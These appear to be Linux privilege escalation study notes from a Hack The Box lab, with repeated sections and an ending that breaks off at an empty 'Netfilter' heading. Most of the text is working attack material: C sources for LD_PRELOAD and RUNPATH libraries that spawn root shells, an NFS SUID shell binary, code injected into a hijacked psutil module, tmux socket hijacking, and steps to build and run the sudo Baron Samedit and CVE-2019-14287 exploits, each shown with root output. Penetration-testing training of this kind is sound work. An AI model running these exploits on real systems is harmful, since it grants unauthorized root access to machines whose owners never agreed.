DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

Search Google for: linux 4.4.0-116-generic exploit and download the applicable PoC.

$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

$ ./kernel_exploit
task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell

root@htb[/htb]# whoami
root
Shared Libraries

Linux programs commonly use dynamically linked shared object libraries — files with the .so extension — which contain compiled code shared across multiple programs to avoid code duplication. When a program runs, the dynamic linker resolves and loads the required shared libraries before execution begins. The system searches for shared libraries in a specific order: paths compiled into the binary with -rpath, paths in the LD_LIBRARY_PATH environment variable, the default directories /lib and /usr/lib, and paths listed in /etc/ld.so.conf. Understanding this search order is critical for shared library privilege escalation because if any directory in the search path is writable by you and comes before the legitimate library's directory, you can place a malicious library there that will be loaded instead. The ldd utility shows all shared libraries required by a binary along with their resolved paths.

$ ldd /bin/ls

linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
LD_PRELOAD Privilege Escalation

The LD_PRELOAD environment variable tells the dynamic linker to load a specified shared library before any others when executing a binary. Functions defined in the preloaded library override the default implementations in standard libraries. This becomes exploitable for privilege escalation when sudo -l output shows env_keep+=LD_PRELOAD in the sudoers defaults — this means sudo preserves the LD_PRELOAD variable from the calling environment. Even if the only sudo-allowed command is something benign like apache2 restart, you can set LD_PRELOAD to point to a malicious shared library containing an _init() function that spawns a root shell, and that library will be loaded when sudo executes the allowed command.

$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass,
    secure_path=...,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

Compile the malicious shared library:

c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
$ gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles

$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
Shared Object Hijacking

Shared object hijacking targets SUID binaries that load non-standard shared libraries from directories with misconfigured write permissions. Unlike the standard library search path, some binaries have a RUNPATH compiled directly into them using the -rpath linker flag. The RUNPATH tells the dynamic linker to look in a specific directory for libraries before searching the default system paths. If that directory is world-writable, you can place a malicious shared library there that will be loaded instead of the legitimate one. The attack starts with identifying SUID binaries, running ldd to see their library dependencies, using readelf to check if a RUNPATH is set, verifying the RUNPATH directory is writable, then compiling a malicious library that implements the expected function.

Shared Object Hijacking — Step by Step

Step 1 — Identify the SUID binary and check its library dependencies with ldd:

$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll

$ ldd payroll
linux-vdso.so.1 (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)

Step 2 — Check the RUNPATH with readelf to confirm the library is loaded from a specific directory:

$ readelf -d payroll | grep PATH
0x000000000000001d (RUNPATH) Library runpath: [/development]

Step 3 — Confirm the RUNPATH directory is writable:

$ ls -la /development/
drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./

Step 4 — Run the binary to identify what function it expects from the library:

$ ./payroll
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

Step 5 — Compile a malicious shared library implementing the expected dbquery function:

c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
$ gcc src.c -fPIC -shared -o /development/libshared.so

$ ./payroll

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
Python Library Hijacking

Python library hijacking is a privilege escalation technique that exploits misconfigured write permissions on Python modules, misconfigured Python library search paths, or the ability to set the PYTHONPATH environment variable when running Python scripts with sudo. The attack relies on the fact that when a Python script imports a module, Python searches for that module through an ordered list of directories and imports the first match it finds. If you can place a malicious file named the same as an imported module in a directory that Python searches before the legitimate module's directory, Python will import your malicious version instead. The key condition that makes this exploitable is that the script must be executed with elevated privileges via sudo, so that your injected code runs as root. There are three primary attack vectors: write permissions on the module file itself, write permissions on a higher-priority directory in the Python search path, and control over the PYTHONPATH environment variable.

Python Library Hijacking — Checking Sudo Privileges

The first step is always sudo -l to understand exactly what Python scripts you can run as root and what environment variable handling is in place. The output shows the exact path to the Python binary and the script it is allowed to run. Also check the SETENV flag — if present, it means you are allowed to set environment variables including PYTHONPATH when running the sudo command, which is itself a complete privilege escalation path. Look at the script path and note that even if you cannot write to the script directly, you may be able to exploit the modules it imports.

$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=...

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
Python Library Hijacking — Reading the Target Script

After identifying the allowed Python script, read its contents to understand what modules it imports. The module names are your primary targets for hijacking. In the example below the script imports psutil and calls psutil.virtual_memory(). Knowing the exact module name and the exact function called within it is critical because your malicious replacement module must implement a function with exactly the same name and the same number of parameters or the script will error out and your payload will not execute. Always note the import statement exactly as written.

$ cat mem_status.py

#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
Python Library Hijacking — Insecure Write Permissions on Module

If the module file itself has world-writable or group-writable permissions, you can directly insert malicious code into it. Use grep -r to find which file within the module directory contains the target function definition, then check that file's permissions with ls -l. If the permissions show -rw-r--rw- or similar world-writable permissions, you can edit the module file and inject your payload at the beginning of the target function. Insert it right at the top of the function body so it executes before the rest of the function. After injecting a test command like os.system('id'), run the script with sudo to confirm execution as root, then replace the test with your real payload.

$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

Inject payload into the module function:

python
def virtual_memory():
    #### Hijacking
    import os
    os.system('id')
    ####

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
Python Library Hijacking — Library Search Path Hijacking

Python searches for modules in a specific priority order defined by sys.path. Directories listed higher in the list are searched before directories listed lower. If the legitimate module is installed in a lower-priority directory, and you have write access to a higher-priority directory, you can place a malicious file named after the module in the writable higher-priority directory. Python will find and import yours first without ever reaching the legitimate module. Check the full search path with python3 -c 'import sys; print("\n".join(sys.path))', then check write permissions on each directory, and find where the target module is installed with pip3 show <module>.

$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages

$ ls -la /usr/lib/python3.8
drwxr-xrwx 30 root root 20480 Dec 14 16:26 .

/usr/lib/python3.8 is world-writable and higher priority than /usr/local/lib/python3.8/dist-packages where psutil is installed. Create a fake psutil.py there:

python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  AttributeError: 'NoneType' object has no attribute 'available'

Code executed as root — the traceback is expected because our fake module does not return a real memory object, but the payload ran successfully.

Python Library Hijacking — PYTHONPATH Environment Variable

PYTHONPATH is an environment variable that specifies additional directories Python should search for modules before the standard sys.path directories. If sudo -l shows the SETENV flag alongside a Python binary in the allowed commands, you are permitted to set environment variables including PYTHONPATH when running the sudo command. This allows you to point Python at any directory you control — for example /tmp/ — and place your malicious module file there. When sudo runs the Python script with your custom PYTHONPATH, Python looks in /tmp/ first, finds your malicious module, and imports it, executing your payload as root regardless of where the legitimate module is installed.

$ sudo -l

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

Place the malicious psutil.py in /tmp/:

python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

Python searched /tmp/ first due to PYTHONPATH, found our malicious psutil.py, imported it, and executed our os.system('id') call as root before the script's normal output was produced.


Linux Privilege Escalation — NFS, Tmux, Kernel Exploits, LD_PRELOAD, Shared Object Hijacking, Python Library Hijacking, Sudo CVEs, Netfilter, Polkit, Dirty Pipe
NFS Weak Permissions

NFS (Network File System) shares files and directories over the network via TCP/UDP port 2049, allowing remote systems to access them as if they were local. The critical misconfiguration that enables privilege escalation is the no_root_squash option in /etc/exports on the server side. When this option is set, any remote user connecting to the NFS share as root retains root privileges on the share — they are not demoted to the nfsnobody unprivileged account as they would be with the default root_squash behaviour. This means you can mount the NFS share from your attacker machine as root, write a SUID binary to it, set the SUID bit, and then execute it on the target system to get a root shell. A critical practical consideration is glibc version mismatch — binaries compiled on a newer system will fail on older targets with errors like GLIBC_2.34 not found. Always compile directly on the target system or use static linking to avoid this problem entirely.

NFS — Enumeration

The first step is to remotely list what NFS exports are available on the target system. The showmount -e command queries the NFS server and returns all exported directories along with who is permitted to mount them. After identifying available shares, check the server-side NFS configuration at /etc/exports on the target to see which options are set — specifically look for no_root_squash. Also check /proc/mounts on the target to see currently active NFS mounts and whether the nosuid option is enforced, because nosuid on a mounted filesystem would prevent SUID binaries from executing with elevated privileges even if you manage to write them there.

$ showmount -e 10.129.2.210
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *

$ cat /etc/exports
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)

$ cat /proc/mounts | grep nfs
NFS — Exploitation via SUID Binary

Once you confirm no_root_squash is set, the exploitation process involves compiling a SUID shell binary. The safest approach is to compile it directly on the target to match the target's glibc version. The C code simply calls setuid(0) and setgid(0) to set root privileges then spawns /bin/bash. On your attacker machine mount the NFS share as root, copy the compiled binary into the mounted share, set root ownership and the SUID bit. Then return to the target and execute the binary — because the NFS export has no_root_squash the SUID bit was written by your root user and is honoured on the target, dropping you into a root shell.

# On TARGET — compile shell binary matching target glibc
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc /tmp/shell.c -o /tmp/shell_local

# On ATTACKER (as root) — mount share, copy binary, set SUID
sudo mount -t nfs 10.129.2.210:/tmp /mnt
cp /tmp/shell_local /mnt/shell_root
chown root:root /mnt/shell_root
chmod 4755 /mnt/shell_root

# Back on TARGET — execute SUID binary
/tmp/shell_root
id
uid=0(root) gid=0(root) groups=0(root)
NFS — Reading Flags Directly

Before attempting complex exploitation, always check whether NFS exports are world-readable and whether sensitive files like flags are directly accessible. Many NFS exports are configured with permissive read permissions so that multiple systems can read from them. If you can list the exported directory and read files directly as your current low-privileged user, there is no need for SUID exploitation at all for simple file reading. Always try the simplest approach first.

$ ls -la /var/nfs/general/
$ cat /var/nfs/general/exports_flag.txt
Tmux Session Hijacking

Tmux is a terminal multiplexer that allows multiple terminal sessions to persist and be accessed within a single console session. A privileged user like root may start a tmux session, detach from it while it continues running in the background (for example while monitoring a long process), and attach the session socket to a group-writable path for convenience. If your current user belongs to the group that has write permissions on that socket file, you can attach directly to the privileged user's running tmux session and inherit all of their privileges without any exploit. The attack is entirely based on misconfigured socket file permissions and requires no vulnerability in tmux itself — it is a pure configuration error. This technique is particularly effective because it is silent, leaves minimal forensic trace, and gives you a fully interactive shell as the privileged user.

Tmux — Enumeration

Enumerate running tmux processes to find any sessions started by privileged users. The ps aux | grep tmux command shows all running tmux processes including the user that started them (UID column) and the socket path specified with the -S flag. Once you identify a socket path, check its file permissions with ls -la. A socket owned by root but with group read-write permissions is exploitable if your user belongs to that group. Always confirm your current group memberships with id and cross-reference against the socket file's group ownership.

$ ps aux | grep tmux
root  4806  0.0  0.1  29416  3204 ?  Ss  06:27  0:00 tmux -S /shareds new -s debugsess

$ ls -la /shareds
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds

$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

Your user is in the devs group and the socket is group-writable for devs — exploitation is possible.

Tmux — Exploitation

Attaching to the privileged tmux session requires only one command — tmux -S <socket_path>. This tells tmux to connect to the session via the specified socket rather than the default socket location. Because the socket has group-write permissions and your user is in the correct group, tmux allows the attachment. You are immediately dropped into the root user's running terminal session with full root privileges. Always verify with id immediately after attaching and read the flag before doing anything else that might disturb the session.

$ tmux -S /shareds

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
Kernel Exploit — CVE-2021-3493 (OverlayFS Ubuntu)

Kernel exploits target vulnerabilities in the Linux kernel itself, bypassing all user-space security controls including sudo rules, AppArmor, SELinux, and SUID restrictions. CVE-2021-3493 abuses the way the Linux kernel handles file capabilities in OverlayFS on Ubuntu systems. OverlayFS is a union filesystem used extensively in containers. The vulnerability allows an unprivileged user to execute a binary with elevated capabilities via a specially constructed OverlayFS mount. It affects kernels before specific patch levels on Ubuntu 18.04 and 20.04. The target kernel 4.15.0-76-generic on Ubuntu 18.04 is confirmed vulnerable. A critical operational point is that kernel exploits must be compiled directly on the target system whenever possible — transferring pre-compiled binaries from newer systems causes glibc version errors that prevent execution.

CVE-2021-3493 — Enumeration and Exploitation

The first step is always to identify the exact kernel version and OS release. The combination of the kernel version string from uname -a and the distribution from /etc/lsb-release tells you precisely which CVEs apply. Once confirmed, transfer the exploit source code to the target, compile it there, make it executable, and run it. A working kernel exploit drops you directly into a root shell. Always read the exploit README or source comments before running to understand what the exploit does and whether it poses any stability risk to the system.

$ uname -a
Linux NIX02 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic

# Transfer exploit source to target
$ scp exploit.c htb-student@10.129.2.210:/tmp/

# On TARGET — compile and execute
$ cd /tmp
$ gcc exploit.c -o exploit
$ chmod +x exploit
$ ./exploit

id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/kernel_exploit/flag.txt
LD_PRELOAD Privilege Escalation

LD_PRELOAD is an environment variable that instructs the dynamic linker to load a specified shared library before all other libraries when any program starts. Functions defined in the preloaded library override the default implementations in standard libraries because they are found first in the loading order. This becomes a privilege escalation vector when sudo -l shows env_keep+=LD_PRELOAD in the sudoers Defaults section — this means sudo explicitly preserves the LD_PRELOAD variable from the calling environment instead of resetting it. The attack works by compiling a malicious shared library whose _init() constructor function calls setuid(0) to gain root privileges and then spawns /bin/bash. When any sudo-allowed command is executed with LD_PRELOAD pointing to your malicious library, the library is loaded first as root and _init() fires before the real program even starts. The actual sudo-allowed command being run (apache2, openssl, etc.) is completely irrelevant — it is simply the vehicle that triggers the library load.

LD_PRELOAD — Enumeration

The key thing to look for in sudo -l output is the env_keep+=LD_PRELOAD entry in the Defaults section. This setting is a security misconfiguration that survives the sudo call and makes the attack possible. Also enumerate other user accounts on the system because the user with this misconfigured sudo rule may not be your current user — you may need to pivot to another account first. Try password reuse across discovered user accounts with su <username> using passwords already found during enumeration. Once on the account with env_keep+=LD_PRELOAD configured, the attack becomes straightforward.

$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

$ cat /etc/passwd | grep -v "nologin\|false"

$ su daniel.carter
LD_PRELOAD — Exploitation

Write the malicious shared library source code in C. The _init() function is automatically called when a shared library is loaded, making it the perfect injection point. It first calls unsetenv("LD_PRELOAD") to clean itself up and avoid recursive loading, then calls setgid(0) and setuid(0) to set root credentials, and finally spawns /bin/bash which inherits the root privileges. Compile it with -fPIC (position independent code, required for shared libraries), -shared (output a shared library), and -nostartfiles (exclude standard startup files which conflict with _init()). Then trigger it by running any sudo-allowed command with LD_PRELOAD set to the full path of your compiled library.

$ cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

$ gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/ld_preload/flag.txt
Shared Object Hijacking

Shared object hijacking targets SUID binaries that load non-standard shared libraries from custom directories defined in their compiled-in RUNPATH. The RUNPATH is a directory path embedded directly into the binary at compile time using the -rpath linker flag, which tells the dynamic linker to search that directory for libraries before searching the standard system paths. If that RUNPATH directory is world-writable, you can place a malicious shared library there with the same filename as the library the binary expects. When the SUID binary runs as root and tries to load the library, it finds and loads your malicious version instead, executing your code with root privileges. The complete attack chain involves identifying the SUID binary, using ldd to find its library dependencies and readelf to confirm the RUNPATH, verifying the RUNPATH directory is writable, discovering what function name the binary expects from the library, implementing that function in a malicious library, and placing it in the writable RUNPATH directory.

Shared Object Hijacking — Enumeration

Start by finding all SUID binaries on the system. Then for each interesting one run ldd to see what shared libraries it loads and from where. A library being loaded from a non-standard path like /development/ or /opt/ is immediately suspicious. Confirm the RUNPATH is intentionally set using readelf -d and look for the RUNPATH tag. Then check whether the RUNPATH directory is writable by your current user. A drwxrwxrwx permission on the RUNPATH directory is the green light for this attack.

$ find / -perm -4000 2>/dev/null
$ ls -la /home/mrb3n/payroll
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll

$ ldd payroll
linux-vdso.so.1 (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)

$ readelf -d payroll | grep PATH
0x000000000000001d (RUNPATH) Library runpath: [/development]

$ ls -la /development/
drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./
Shared Object Hijacking — Discovering the Required Function Name

Before compiling your malicious library you need to know the exact function name that the SUID binary expects to find in the shared library. If you compile a library without implementing the right function, the binary will fail with an undefined symbol error. You can intentionally trigger this error by copying a legitimate standard library to the RUNPATH directory under the expected library name — when the binary loads it and tries to call the missing function, the error message tells you exactly what function name you need to implement.

$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

$ ./payroll
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

The binary expects a function called dbquery — this is what your malicious library must implement.

Shared Object Hijacking — Exploitation

Now compile a malicious shared library that implements the dbquery function. Inside that function call setuid(0) to set root user ID and then spawn /bin/sh -p with the -p flag which preserves the effective UID set by setuid. Place the compiled library directly into the writable RUNPATH directory under the exact filename that ldd showed the binary expects. Then execute the SUID binary — it loads your library as root, calls dbquery(), your code executes, and you get a root shell.

$ cat > /tmp/src.c << 'EOF'
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF

$ gcc /tmp/src.c -fPIC -shared -o /development/libshared.so

$ ./payroll

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)

$ cat /root/shared_obj_hijack/flag.txt
Python Library Hijacking

Python library hijacking is a privilege escalation technique that exploits misconfigurations in how Python resolves and imports modules when a script is executed with elevated privileges via sudo. When Python imports a module it searches through an ordered list of directories defined in sys.path and imports the first matching file it finds. Three distinct attack vectors exist depending on what is misconfigured. Vector 1 targets the module file itself being world-writable, allowing direct code injection. Vector 2 targets a higher-priority directory in sys.path being writable, allowing you to shadow the legitimate module with a fake one. Vector 3 targets the SETENV flag in sudoers being set, allowing you to specify PYTHONPATH=/tmp to redirect Python's module search entirely. All three require the script to be executed via sudo so that your injected code runs as root. The key enumeration steps are checking sudo -l, reading the target script to identify imported modules, finding where those modules are installed, checking write permissions on the module file and on higher-priority sys.path directories, and checking for the SETENV flag.

Python Library Hijacking — Enumeration
$ sudo -l

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

$ cat ~/mem_status.py
#!/usr/bin/env python3
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")

$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 __init__.py

$ python3 -c 'import sys; print("\n".join(sys.path))'
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

$ ls -la /usr/lib/python3.8
drwxr-xrwx 30 root root 20480 Dec 14 16:26 .

$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages
Python Library Hijacking — Vector 1: Direct Module File Injection

When the module file itself has world-writable permissions (-rw-r--rw-), you can inject code directly into the target function inside the module. The injected code runs every time that function is called. Insert your payload right at the start of the target function body so it executes before the function's normal code. Use a Python script to safely inject lines after the function definition line to avoid corrupting the file syntax. After injecting a test payload like os.system('id'), run the script with sudo to confirm root execution, then replace the test with your actual payload such as copying the root flag to a readable location.

$ python3 << 'EOF'
with open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'r') as f:
    lines = f.readlines()

new_lines = []
for i, line in enumerate(lines):
    new_lines.append(line)
    if 'def virtual_memory():' in line:
        new_lines.append('    import os\n')
        new_lines.append('    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")\n')

with open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'w') as f:
    f.writelines(new_lines)
EOF

$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
Python Library Hijacking — Vector 2: Search Path Hijacking

When a higher-priority directory in sys.path is world-writable and the target module is installed in a lower-priority directory, you can create a fake module file in the writable higher-priority directory. Python finds and imports your file first because it searches sys.path from top to bottom. The fake module must implement a function with exactly the same name as the function called in the target script, and it must return something of the correct type so the script does not immediately crash after your payload runs. Use a Dummy class with the required attributes to satisfy the calling script's expectations while still executing your payload.

$ cat > /usr/lib/python3.8/psutil.py << 'EOF'
import os

def virtual_memory():
    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")
    class Dummy:
        available = 1
        total = 1
    return Dummy()
EOF

$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
Python Library Hijacking — Vector 3: PYTHONPATH Environment Variable Hijacking

When sudo -l shows SETENV: NOPASSWD: /usr/bin/python3 in the allowed commands, you are permitted to set environment variables when running Python via sudo. Setting PYTHONPATH=/tmp before the sudo command makes Python search /tmp first for any module being imported. Create a fake psutil.py in /tmp with your payload function, then run the sudo command with PYTHONPATH=/tmp prepended. Python finds your fake module in /tmp before reaching the legitimate installation in /usr/local/lib/python3.8/dist-packages/, imports it, and executes your code as root.

$ cat > /tmp/psutil.py << 'EOF'
import os

def virtual_memory():
    os.system("cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt")
    class Dummy:
        available = 1
        total = 1
    return Dummy()
EOF

$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/htb-student/mem_status.py
$ cat /tmp/flag.txt
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
Python Library Hijacking — Fixing a Corrupted Module File

If you inject code into a module file multiple times or make a syntax error during injection, the module file can become corrupted and Python will refuse to import it, breaking the script entirely. Diagnose corruption using ast.parse which reports syntax errors with line numbers. Then inspect the lines around the reported error to identify duplicate or malformed injections. Use a Python script to view specific line ranges and another to remove the corrupted lines while keeping everything else intact. Always keep a backup of any module file before modifying it.

$ python3 -c "import ast; ast.parse(open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py').read())"

$ grep -n "import os" /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

$ python3 << 'EOF'
with open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'r') as f:
    lines = f.readlines()
for i, line in enumerate(lines[1918:1932], start=1919):
    print(f"{i}: {repr(line)}")
EOF

$ python3 << 'EOF'
with open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'r') as f:
    lines = f.readlines()

new_lines = []
for i, line in enumerate(lines):
    if 1920 <= i+1 <= 1928 and ('import os' in line or 'os.system' in line) and i+1 != 1920:
        continue
    new_lines.append(line)

with open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'w') as f:
    f.writelines(new_lines)
print("Done")
EOF
Sudo — Overview and /etc/sudoers

Sudo is used on Unix-based operating systems to start processes with the rights of another user, most commonly root. It serves as an additional security layer to prevent unauthorized damage to the system by requiring explicit permission grants rather than giving users direct root access. The /etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges. Lines in sudoers follow the format user HOST=(runas_user) command. The ALL=(ALL:ALL) ALL entry grants unrestricted sudo access. The %sudo ALL=(ALL:ALL) ALL entry grants sudo access to all members of the sudo group. Individual entries like cry0l1t3 ALL=(ALL) /usr/bin/id restrict a user to only running specific commands with sudo. Always read the full sudoers output carefully — individual command restrictions are frequently misconfigured in exploitable ways.

$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
Sudo — CVE-2021-3156 Baron Samedit

CVE-2021-3156 is a heap-based buffer overflow vulnerability in sudo that had been present for over ten years before discovery. It affected sudo versions 1.8.31 on Ubuntu 20.04, 1.8.27 on Debian 10, and 1.9.2 on Fedora 33 among others. The vulnerability allows any local user to gain root privileges without needing any sudo permissions at all — it does not matter what is in the sudoers file. This makes it especially powerful because it bypasses sudo's permission model entirely by exploiting the sudo binary itself at a memory corruption level. The exploit has publicly available PoC code and is straightforward to compile and execute. The first step is identifying the exact sudo version and the OS version, then running the exploit with the appropriate target ID.

$ sudo -V | head -n1
Sudo version 1.8.31

$ cat /etc/lsb-release
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal

$ git clone https://github.com/blasty/CVE-2021-3156.git
$ cd CVE-2021-3156
$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

$ ./sudo-hax-me-a-sandwich

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa)   - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster)           - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

$ ./sudo-hax-me-a-sandwich 1

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
** pray for your rootshell.. **

# id
uid=0(root) gid=0(root) groups=0(root)
Sudo — CVE-2019-14287 Policy Bypass

CVE-2019-14287 is a sudo policy bypass vulnerability affecting all versions below 1.8.28. It requires only one prerequisite — the user must have a sudo entry that allows running any command, even a specific one. The vulnerability abuses the way sudo handles user IDs specified with the -u flag. Sudo normally allows specifying a user by name or ID to run commands as that user. However when a negative ID of -1 is passed, sudo incorrectly processes it as user ID 0 (root) due to an integer conversion error. This means that if your sudo entry allows you to run any command at all — even something as harmless as /usr/bin/id — you can use -u#-1 to run it as root instead of your own user.

$ sudo -l

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

$ cat /etc/passwd | grep cry0l1t3
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash

$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)

The -u#-1 flag tells sudo to run the command as user ID -1, which is incorrectly processed as 0 (root) by vulnerable versions.

Netfilter

